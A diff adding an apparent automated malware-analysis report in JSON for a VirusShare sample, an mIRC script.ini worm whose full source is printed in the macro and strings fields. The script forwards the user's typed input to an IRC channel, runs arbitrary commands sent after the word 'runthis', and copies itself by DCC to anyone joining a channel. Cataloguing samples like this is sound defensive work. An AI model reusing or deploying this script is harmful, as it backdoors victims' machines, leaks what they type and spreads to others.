@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "[script]\nn0=remove.scrip\nn1=\nn2=\nn3=on 1:START:{\nn4=  .sreq ignore\nn5=  .remote on\nn6=}\nn7=on 1:CONNECT:\nn8=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe\nn9=on 1:INPUT:*:{\nn10=  .msg #planetalammer ( $+ $active $+ ) $1-\nn11=}\nn12=on 1:TEXT:*:?:{\nn13=  if ( $1 == runthis ) { .run $2- }\nn14=}\nn15=\nn16=on 1:JOIN:*:{\nn17=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini\nn18=}"
+    },
+    "filename": "VirusShare_59a241adc63906da469d9ea17050c8b4",
+    "filesize": 429,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "59a241adc63906da469d9ea17050c8b4",
+        "sha1": "63e5311efa3663e0426a800f23249dd2af7516c0",
+        "sha256": "9efdaab64d30d91abbd8514ff5f69684a4b296ae184f35addbf1c9cf4c7c60ec"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=remove.scrip",
+            "n3=on 1:START:{",
+            "n4=  .sreq ignore",
+            "n5=  .remote on",
+            "n6=}",
+            "n7=on 1:CONNECT:",
+            "n8=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe",
+            "n9=on 1:INPUT:*:{",
+            "n10=  .msg #planetalammer ( $+ $active $+ ) $1-",
+            "n11=}",
+            "n12=on 1:TEXT:*:?:{",
+            "n13=  if ( $1 == runthis ) { .run $2- }",
+            "n14=}",
+            "n15=",
+            "n16=on 1:JOIN:*:{",
+            "n17=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini",
+            "n18=}"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.310435",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
